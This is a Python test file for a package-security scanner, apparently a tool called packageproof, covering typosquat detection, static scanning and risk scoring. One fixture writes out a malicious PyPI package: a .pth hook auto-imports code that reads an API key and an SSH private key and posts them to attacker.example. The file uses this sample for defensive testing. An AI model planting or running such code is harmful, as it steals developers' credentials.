from __future__ import annotations

from packageproof.models.schemas import (
    AnalyzePackageRequest,
    EvidenceBundle,
    RegistryResult,
    SourceArchive,
)
from packageproof.services.name_attack import NameAttackDetector
from packageproof.services.scoring import ScoreEngine
from packageproof.services.static_scanner import StaticScanner


def test_name_attack_detects_known_npm_typosquat():
    request = AnalyzePackageRequest(ecosystem="npm", package="browserlist")
    registry = RegistryResult(
        ecosystem="npm",
        package="browserlist",
        requested_version="latest",
        resolved_version="1.0.0",
        exists=True,
    )

    result = NameAttackDetector().analyze(request, registry)

    assert result["safer_alternatives"] == ["browserslist"]
    assert result["signals"][0]["type"] == "typosquatting"


def test_static_scanner_builds_secret_exfiltration_chain():
    request = AnalyzePackageRequest(ecosystem="pypi", package="badpkg")
    registry = RegistryResult(
        ecosystem="pypi",
        package="badpkg",
        requested_version="latest",
        resolved_version="1.0.0",
        exists=True,
    )
    archive = SourceArchive(
        files={
            "badpkg.pth": "import badpkg.bootstrap\n",
            "badpkg/bootstrap.py": (
                "import os, requests\n"
                "token = os.environ.get('OPENAI_API_KEY')\n"
                "ssh = open('/home/user/.ssh/id_rsa').read()\n"
                "requests.post('https://attacker.example/upload', data=ssh + token)\n"
            ),
        }
    )

    result = StaticScanner().scan(request, registry, archive)

    assert "credential_stealer" in result["attack_type_candidates"]
    assert "network_exfiltration" in result["attack_type_candidates"]
    assert any(
        chain["type"] == "possible_secret_exfiltration"
        for chain in result["behavior_chain"]
    )


def test_score_blocks_clear_static_malware_chain():
    request = AnalyzePackageRequest(ecosystem="pypi", package="badpkg")
    evidence = EvidenceBundle(
        registry={
            "metadata": {
                "reputation": {"signals": []},
                "name_attack": {"signals": [], "safer_alternatives": []},
            },
            "errors": [],
        },
        static={
            "findings": [
                {"type": "install_script_abuse", "severity": "high"},
                {"type": "credential_stealer", "severity": "high"},
                {"type": "network_exfiltration", "severity": "high"},
            ]
        },
        behavior_chain=[
            {
                "type": "possible_secret_exfiltration",
                "severity": "critical",
                "events": ["credential_stealer", "network_exfiltration"],
            }
        ],
    )

    result = ScoreEngine().score(request, evidence)

    assert result.verdict == "block"
    assert result.agent_action == "do_not_install"
